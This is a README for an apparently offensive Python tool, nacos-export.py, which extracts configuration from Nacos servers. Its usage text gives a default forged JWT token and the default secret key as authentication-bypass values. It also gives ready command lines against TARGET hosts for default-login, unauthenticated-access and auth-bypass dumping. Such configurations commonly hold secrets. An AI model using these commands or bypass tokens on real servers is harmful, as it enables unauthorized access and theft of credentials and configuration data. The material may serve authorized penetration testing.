# NACOS EXPORT

## Feature

- ✅ 通过nacos账号密码导出配置
- ✅ 通过secretkey导出配置
- ✅ 通过token导出配置
- ✅ 通过unauth/bypass导出配置
- ✅ 导出配置数量统计
- ✅ 通过sql导出配置
- ✅ 判断是否使用derby数据库

## Use

考虑到NACOS部署方式不同，在设置目标路径时，指向 `/v1`的上一级目录.

> 若要将结果保存至文件，请通过重定向输出方式

```text
$ python3 nacos-export.py -h
usage: nacos-export.py [-h] -u URL [-U USERNAME] [-P PASSWORD] [-T TOKEN] [-S SECRETKEY] [--proxy PROXY] [--check-derby]
                       [--apidump] [--sqldump] [--no-color]

 ______________
< Nacos Export >         @Author: Arm!tage
 --------------          @Version: v1.5.0
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |         
                ||     ||

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     NACOS url, before '/v1'
  -U USERNAME, --username USERNAME
                        NACOS username, default: nacos
  -P PASSWORD, --password PASSWORD
                        NACOS password, default: nacos
  -T TOKEN, --token TOKEN
                        token, default: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-
                        isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
  -S SECRETKEY, --secretkey SECRETKEY
                        secretkey, default: SecretKey012345678901234567890123456789012345678901234567890123456789
  --proxy PROXY         set proxy, example: http://127.0.0.1:8080
  --check-derby         Check standalone mode
  --apidump             extract NACOS config
  --sqldump             extract NACOS config from Derby database
  --no-color            Print without Color
```

## Nuclei Template

- **nacos-default-login**
  - `python3 nacos-export.py -u http://TARGET:8848/nacos -U nacos -P nacos --apidump`
- **unauthenticated-nacos-access**
  - `python3 nacos-export.py http://TARGET:8848/nacos --apidump`
- **nacos-auth-bypass**
  - `python3 nacos-export.py http://TARGET:8848/nacos --apidump`
- **nacos-authentication-bypass:extracted-credentials**
  - `python3 nacos-export.py http://TARGET:8848/nacos -T eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g --apidump`
